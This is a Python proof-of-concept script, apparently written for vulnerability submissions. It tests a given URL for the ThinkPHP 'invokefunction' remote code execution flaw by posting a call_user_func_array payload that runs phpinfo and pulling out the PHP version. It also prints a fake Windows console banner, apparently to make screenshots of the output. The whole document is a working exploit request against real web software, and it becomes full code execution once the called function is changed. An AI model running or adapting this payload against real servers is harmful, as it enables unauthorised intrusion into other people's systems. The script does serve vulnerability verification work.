#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()



regular = "(PHP Version [0-9\.]+)"

def verify(url):
    try:
        """
        检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
        """
        burp0_url = url + "/index.php?s=/Index/\\think\\app/invokefunction"
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip"}
        burp0_data = {"function": "call_user_func_array", "vars[0]": "phpinfo", "vars[1][]": "1"}
        req = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)      
        info = re.findall(regular, req.text)
        if len(info) != 0:
            return info[0]
        else:
            return ""
    except Exception as e:
        raise e
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 thinkphp_invoke_rce.py",target)
    if info != "":
        print("[+]漏洞存在，执行代码 phpinfo(), PHP 版本：", info)
    else:
        print("[-]漏洞不存在")
